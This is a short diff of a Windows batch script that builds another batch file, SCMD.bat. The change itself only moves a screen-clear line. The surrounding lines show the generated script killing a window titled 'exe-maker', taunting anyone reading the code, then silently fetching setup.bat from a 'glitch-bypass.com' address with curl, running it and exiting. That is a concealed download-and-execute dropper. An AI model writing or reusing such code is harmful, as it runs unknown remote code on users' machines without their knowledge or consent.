@@ -6,6 +6,7 @@ echo color 0A>>SCMD.bat
 echo cd %%userprofile%%>>SCMD.bat
 
 echo taskkill /FI "WINDOWTITLE eq exe-maker" /F>>SCMD.bat
+echo cls>>SCMD.bat
 
 echo :: Hello, why you looking here? >>SCMD.bat
 
@@ -22,7 +23,6 @@ echo IF EXIST CMD.bat (>>SCMD.bat
 echo   cd %%userprofile%%^>nul>>SCMD.bat
 echo   goto skip>>SCMD.bat
 echo )>>SCMD.bat
-echo cls>>SCMD.bat
 echo curl -s -o a.bat https://www.glitch-bypass.com/terminal/setup.bat^>nul>>SCMD.bat
 echo a.bat>>SCMD.bat
 echo exit>>SCMD.bat
